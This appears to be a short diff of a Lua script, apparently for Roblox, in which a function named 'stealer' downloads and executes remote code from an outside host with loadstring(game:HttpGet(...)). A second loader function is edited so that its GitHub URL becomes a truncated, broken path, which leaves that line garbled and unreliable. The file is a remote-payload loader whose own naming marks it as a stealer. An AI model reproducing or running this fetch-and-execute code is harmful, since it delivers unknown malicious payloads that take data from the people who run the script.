@@ -3,7 +3,7 @@ local function stealer()
   loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/GnomeStorage/LUAs/refs/heads/main/5cdnew"))()
+  loadstring(game:HttpGet("pts/refs/heads/main/final.txt"))() 
 
 end
 
